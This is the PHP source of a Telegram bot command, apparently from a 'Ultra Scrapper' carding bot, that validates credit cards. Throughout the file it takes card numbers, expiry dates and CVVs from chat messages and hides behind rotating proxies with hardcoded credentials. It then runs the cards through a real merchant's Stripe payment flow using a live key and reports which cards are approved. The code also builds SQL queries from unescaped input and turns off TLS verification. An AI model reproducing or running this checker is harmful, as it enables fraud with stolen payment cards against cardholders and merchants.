<?php
/*
///==[Stripe CC Checker Commands]==///
/ss creditcard - Checks the Credit Card
*/

$query = "SELECT * FROM users WHERE user_id='$userId'";
$result = mysqli_query($link, $query);

// Verificar si el usuario no está registrado
if (mysqli_num_rows($result) == 0) {
    // No hacer nada si el usuario no está registrado
    return;
}



$cmd = trim($message);
if ($cmd === '/an') {
    $content = [
        'chat_id' => $chat_id,
        'text' => "
━━━━━「𝗨𝗹𝘁𝗿𝗮 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿」 ━━━━
<i>♻️ Comando</i> <i>/an</i>
<i>🔰 Formato:</i> <code>cc|mm|yy|cvv</code>
<i>➤ Gateway:</i> <code>Stripe Charged</code>
━━━━━「𝗨𝗹𝘁𝗿𝗮 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿」 ━━━━",
        'parse_mode' => 'html',
        'reply_to_message_id' => $message_id
    ];

    bot('sendmessage', $content);
    exit;
}
////////////====[MUTE]====////////////
if(strpos($message, "/an ") === 0 || strpos($message, ".an ") === 0){   


        $messageidtoedit1 = 
          bot('sendmessage',[
          'chat_id'=>$chat_id,
          'text'=>"<b>Wait for Result...</b>",
          'parse_mode'=>'html',
          'reply_to_message_id'=> $message_id
         
        ]);
   
        $messageidtoedit = capture(json_encode($messageidtoedit1), '"message_id":', ',');
        $lista = trim(substr($message, 4));
        $bin = substr($cc, 0, 6);
        $starttim = microtime(true);
        
        $starttime = intval(microtime(true) - $starttim);
        if(preg_match_all("/(\d{16})[\/\s:|]*?(\d\d)[\/\s|]*?(\d{2,4})[\/\s|-]*?(\d{3})/", $lista, $matches)) {
            $creditcard = $matches[0][0];
            $cc = multiexplode(array(":", "|", "/", " "), $creditcard)[0];
            $mes = multiexplode(array(":", "|", "/", " "), $creditcard)[1];
            $ano = multiexplode(array(":", "|", "/", " "), $creditcard)[2];
            $cvv = multiexplode(array(":", "|", "/", " "), $creditcard)[3];
        bot('editMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$messageidtoedit,
  'text'=>"
  <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
 <i><b>➜[Credit Card] »</b></i><code>$lista</code>
 <i><b>➜[Loading]....■■□□□□□□□□ →20%</b></i>
 <i><b>➜[Time] » → $starttime</b></i>sg ",
  'disable_web_page_preview'=>'true',
  'parse_mode'=>'html'
    ]);

            ###CHECKER PART###  
            $zip = rand(10001,90045);
            $time = rand(30000,699999);
            $rand = rand(0,99999);
            $pass = rand(0000000000,9999999999);
            $email = substr(md5(mt_rand()), 0, 7);
            $name = substr(md5(mt_rand()), 0, 7);
            $last = substr(md5(mt_rand()), 0, 7);
            $starttime = intval(microtime(true) - $starttim);
        bot('editMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$messageidtoedit,
  'text'=>"
  <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
  'disable_web_page_preview'=>'true',
  'parse_mode'=>'html'
    ]);
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, 'https://m.stripe.com/6');
            curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_HTTPHEADER, array(
            'Host: m.stripe.com',
            'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36',
            'Accept: */*',
            'Accept-Language: en-US,en;q=0.5',
            'Content-Type: text/plain;charset=UTF-8',
            'Origin: https://m.stripe.network',
            'Referer: https://m.stripe.network/inner.html'));
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
            curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
            curl_setopt($ch, CURLOPT_POSTFIELDS, "");
            $res = curl_exec($ch);
            $muid = trim(strip_tags(capture($res,'"muid":"','"')));
            $sid = trim(strip_tags(capture($res,'"sid":"','"')));
            $guid = trim(strip_tags(capture($res,'"guid":"','"')));
            $info = curl_getinfo($ch);

bot('editMessageText',[
  'chat_id'=>$chat_id,
  'message_id'=>$messageidtoedit,
 'text'=>"
 <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■■■□□□□□ →50%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
  'disable_web_page_preview'=>'true',
  'parse_mode'=>'html'
    ]);
         //==================[BIN LOOK-UP]======================//
         $fim = json_decode(file_get_contents('https://bins.antipublic.cc/bins/'.$cc), true);
         $bin = $fim["bin"];
         $brand = $fim["brand"];
         $country = $fim["country"];
         $country_name = $fim["country_name"];
         $country_flag = $fim["country_flag"];
         $country_currencies = $fim["country_currencies"];
         $bank = $fim["bank"];
         $level = $fim["level"];
         $type = $fim["type"];
         $starttime = intval(microtime(true) - $starttim);
              bot('editMessageText',[
    'chat_id'=>$chat_id,
    'message_id'=>$messageidtoedit,
    'text'=>"
 <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■■■■□□□□ →70%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
    'disable_web_page_preview'=>'true',
    'parse_mode'=>'html'
      ]);
     # <==[Sección de proxies]==>
$Websharegay = rand(0,10);
$rp1 = array(
1 => 'zqkeryqm-rotate:vvkccjnuo8z7',
2 => 'zqkeryqm-'.$Websharegay.':vvkccjnuo8z7',
); 
$rpt = array_rand($rp1);
$rotate = $rp1[$rpt];
$ip = array(
1 => 'socks5://p.webshare.io:1080',
2 => 'http://p.webshare.io:80',
); 
$socks = array_rand($ip);
$socks5 = $ip[$socks];
$url = "https://api.ipify.org/";   
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
$ip1 = curl_exec($ch);
curl_close($ch);
ob_flush();   
if (isset($ip1)){
$ip = "𝐏𝐫𝐨𝐱𝐲 𝐋𝐢𝐯𝐞 ✅";
}
if (empty($ip1)){
$ip = "𝐃𝐞𝐚𝐝 𝐏𝐫𝐨𝐱𝐲![".$rotate."]";
}
$starttime = intval(microtime(true) - $starttim);
         bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"
 <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■■■■■■□□ →90%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
            'disable_web_page_preview'=>'true',
            'parse_mode'=>'html'
              ]);
# == [Fin de sección de proxies]  ==>
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://intelephense.com/payment-intent');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
curl_setopt($ch, CURLOPT_HTTPHEADER, [
    'Accept: */*',
    'Accept-Language: es-ES,es;q=0.9,en;q=0.8',
    'Cache-Control: no-cache',
    'Connection: keep-alive',
    'Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqUPwauwUGdQDhEGq',
    'Origin: https://intelephense.com',
    'Pragma: no-cache',
    'Referer: https://intelephense.com/',
    'Sec-Fetch-Dest: empty',
    'Sec-Fetch-Mode: cors',
    'Sec-Fetch-Site: same-origin',
    'user-agent: Mozilla/5.0 (Windows NT ' . rand(11, 99) . '.0; Win64; x64) AppleWebKit/' . rand(111, 999) . '.' . rand(11, 99) . ' (KHTML, like Gecko) Chrome/' . rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999) . ' Safari/' . rand(111, 999) . '.' . rand(11, 99) . '',
    'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
    'sec-ch-ua-mobile: ?0',
    'sec-ch-ua-platform: "Windows"',
    'Accept-Encoding: gzip',
]);
curl_setopt($ch, CURLOPT_PROXY, $socks5);
curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate); 
curl_setopt($ch, CURLOPT_POSTFIELDS, "------WebKitFormBoundaryqUPwauwUGdQDhEGq\r\nContent-Disposition: form-data; name=\"currencyCode\"\r\n\r\nUSD\r\n------WebKitFormBoundaryqUPwauwUGdQDhEGq\r\nContent-Disposition: form-data; name=\"countryCode\"\r\n\r\nGT\r\n------WebKitFormBoundaryqUPwauwUGdQDhEGq\r\nContent-Disposition: form-data; name=\"regionCode\"\r\n\r\n\r\n------WebKitFormBoundaryqUPwauwUGdQDhEGq\r\nContent-Disposition: form-data; name=\"quantity\"\r\n\r\n1\r\n------WebKitFormBoundaryqUPwauwUGdQDhEGq\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\n".$name."@gmail.com\r\n------WebKitFormBoundaryqUPwauwUGdQDhEGq\r\nContent-Disposition: form-data; name=\"name\"\r\n\r\nalejandro Jose\r\n------WebKitFormBoundaryqUPwauwUGdQDhEGq\r\nContent-Disposition: form-data; name=\"companyName\"\r\n\r\n".$name."\r\n------WebKitFormBoundaryqUPwauwUGdQDhEGq--\r\n");
$result1 = curl_exec($ch);

      $req1=json_decode($result1);
      $id1 = $req1->secret;
      $id = substr($id1, 0, strpos($id1, '_', strpos($id1, '_') + 1));
 
    
        


      $ch = curl_init();
      curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents/'.$id.'/confirm');
      curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
      curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
      curl_setopt($ch, CURLOPT_HTTPHEADER, [
          'authority: api.stripe.com',
          'accept: application/json',
          'accept-language: es-ES,es;q=0.9,en;q=0.8',
          'cache-control: no-cache',
          'content-type: application/x-www-form-urlencoded',
          'origin: https://js.stripe.com',
          'pragma: no-cache',
          'referer: https://js.stripe.com/',
          'sec-ch-ua: "Google Chrome";v="113", "Chromium";v="113", "Not-A.Brand";v="24"',
          'sec-ch-ua-mobile: ?0',
          'sec-ch-ua-platform: "Windows"',
          'sec-fetch-dest: empty',
          'sec-fetch-mode: cors',
          'sec-fetch-site: same-site',
          'user-agent: Mozilla/5.0 (Windows NT ' . rand(11, 99) . '.0; Win64; x64) AppleWebKit/' . rand(111, 999) . '.' . rand(11, 99) . ' (KHTML, like Gecko) Chrome/' . rand(11, 99) . '.0.' . rand(1111, 9999) . '.' . rand(111, 999) . ' Safari/' . rand(111, 999) . '.' . rand(11, 99) . '',
          'accept-encoding: gzip',
      ]);
      curl_setopt($ch, CURLOPT_PROXY, $socks5);
     curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);  
      curl_setopt($ch, CURLOPT_POSTFIELDS, 'receipt_email='.$name.'%40gmail.com&payment_method_data[type]=card&payment_method_data[billing_details][name]=alejandro+Jose&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[card][number]='.$cc.'&payment_method_data[card][cvc]='.$cvv.'&payment_method_data[card][exp_month]='.$mes.'&payment_method_data[card][exp_year]='.$ano.'&payment_method_data[guid]=68470569-0cea-40fa-b2b8-bedce477f3f76d9ef1&payment_method_data[muid]='.$muid.'&payment_method_data[sid]='.$sid.'&payment_method_data[payment_user_agent]=stripe.js%2F20e004c1e5%3B+stripe-js-v3%2F20e004c1e5&payment_method_data[time_on_page]=69065&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_51Ezc9sFGdiE4ZMKLcPWQg288QxmFC1744Xo1JjnI4MI3PZqTLlj1l4D4xm1GnvkMZmELVhGsI6CZ6Kbdcnj8pcOB00J9SOc1Zp&client_secret='.$id1.'');
      
   
       
      $response = curl_exec($ch);
      $req111 = json_decode($response);
      
      if (isset($req111->error->message)) {
        $errormessage1 = $req111->error->message;
        $quita = str_replace(array("\r", "\n"), ' ', $errormessage1);
        $quita2 = strip_tags($quita);
        $telegramMessage1 = str_replace(array("\r", "\n"), ' ', $quita2);
        $telegramMessage2 = htmlspecialchars($telegramMessage1, ENT_QUOTES, 'UTF-8');
        $errormessage = trim($telegramMessage2);
      } elseif (isset($req111->status) && $req111->status === 'requires_action') {
        $errormessage = "Se requiere una acción adicional para completar el pago.";
      } else {
        $errormessage = "Ha ocurrido un error desconocido en el proceso de pago.";
      }
      
      // Luego puedes utilizar la variable $errormessage según tus necesidades
      

  $starttime = intval(microtime(true) - $starttim);
   bot('editMessageText',[
                'chat_id'=>$chat_id,
                'message_id'=>$messageidtoedit,
                'text'=>"
 <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card]»</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■■■■■■■□ →95%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
                'disable_web_page_preview'=>'true',
                'parse_mode'=>'html'
                  ]);


              
          
          $info = curl_getinfo($ch);
          $time = $info['total_time'];
          $time = substr_replace($time, '',4);
          $enlace = "https://t.me/Azunainfo";
          ###END OF CHECKER PART###
          
 
          $starttime = intval(microtime(true) - $starttim);
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"
 <code><i>Gateway ➤</i></code> <b>Stripe Auth</b>
<i><b>➜[Credit Card] »</b></i><code>$lista</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → $starttime</b></i>sg ",
                    'disable_web_page_preview'=>'true',
                    'parse_mode'=>'html'
                      ]);
                      $query = "SELECT * FROM users WHERE user_id='$userId'";
                      $result = mysqli_query($link, $query);
                      
                      // Verificar si el usuario está registrado
                      if (mysqli_num_rows($result) > 0) {
                          $row = mysqli_fetch_assoc($result);
                          $rank = $row['status'];
                      }
          if ($req_2['status'] == 'succeeded') {
            bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
'text'=>"
<i>Card ➤</i> <code>$lista</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> $errormessage</code>
<i>Gateway ➤</i> Stripe Auth
━━━━━━━━━━━━
<i>Bin ➤</i> <code>$level -  $type [$country_flag]</code>
<i>Bank ➤</i> <code>$bank</code>
<i>Country ➤</i> <code>$country_name - $country</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>$time</code>sg
<i>User ➤</i> <i>$username</i> [$rank]
<i>Owner by ➤</i> <code>@NadaImportanteZzz</code>",
              'disable_web_page_preview'=>'true',
              'parse_mode'=>'html',
               'reply_markup' => json_encode([
                'inline_keyboard' => [
                [
                ['text' => "𝗨𝗹𝘁𝗿𝗮 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗲", 'url' => "https://t.me/UltraScrapperRefes"],
                ],
                ],
                'resize_keyboard' => true
                ])
                ]);
              
              }
                elseif($errormessage=="There are several reasons for order failure; among them are errors in the payment information, insufficient funds, or you need to contact your card issuer to inquire about the decline. If you have verified your information and can still place your order, don’t hesitate to contact our Customer Service."){
                  bot('editMessageText',[
                    'chat_id'=>$chat_id,
                    'message_id'=>$messageidtoedit,
                    'text'=>"
<i>Card ➤</i> <code>$lista</code>
<i>Status ➤</i> <b>Declined! ❌</b> 
<i>Message ➤</i><code> Your payment has been declined.</code>
<i>Gateway ➤</i> Stripe Auth
━━━━━━━━━━━━
<i>Bin ➤</i> <code>$level -  $type [$country_flag]</code>
<i>Bank ➤</i> <code>$bank</code>
<i>Country ➤</i> <code>$country_name - $country</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>$time</code>sg
<i>User ➤</i> <i>$username</i> [$rank]
<i>Owner by ➤</i> <code>@NadaImportanteZzz</code>",
                                'disable_web_page_preview'=>'true',
                                'parse_mode'=>'html',
                                'reply_markup' => json_encode([
                                 'inline_keyboard' => [
                                 [
                                 ['text' => "𝗨𝗹𝘁𝗿𝗮 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗲", 'url' => "https://t.me/UltraScrapperRefes"],
                                 ],
                                 ],
                                 'resize_keyboard' => true
                                 ])
                                 ]);
                               
                               
                }   
          else{
            bot('editMessageText',[
              'chat_id'=>$chat_id,
              'message_id'=>$messageidtoedit,
              'text'=>"
<i>Card ➤</i> <code>$lista</code>
<i>Status ➤</i> <b>Declined! ❌</b> 
<i>Message ➤</i><code> $errormessage</code>
<i>Gateway ➤</i> Stripe Auth
━━━━━━━━━━━━
<i>Bin ➤</i> <code>$level -  $type [$country_flag]</code>
<i>Bank ➤</i> <code>$bank</code>
<i>Country ➤</i> <code>$country_name - $country</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>$time</code>sg
<i>User ➤</i> <i>$username</i> [$rank]
<i>Owner by ➤</i> <code>@NadaImportanteZzz</code>",
                          'disable_web_page_preview'=>'true',
                          'parse_mode'=>'html',
                          'reply_markup' => json_encode([
                           'inline_keyboard' => [
                           [
                           ['text' => "𝗨𝗹𝘁𝗿𝗮 𝗦𝗰𝗿𝗮𝗽𝗽𝗲𝗿 𝗥𝗲𝗳𝗲𝗿𝗲𝗻𝗰𝗲", 'url' => "https://t.me/UltraScrapperRefes"],
                           ],
                           ],
                           'resize_keyboard' => true
                           ])
                           ]);
                         
                         }
      }else{
        bot('editMessageText',[
            'chat_id'=>$chat_id,
            'message_id'=>$messageidtoedit,
            'text'=>"<b>PLEASE ENTER VALID CC</b>",
            'parse_mode'=>'html',
            'disable_web_page_preview'=>'true',
            
            
        ]);
      }
}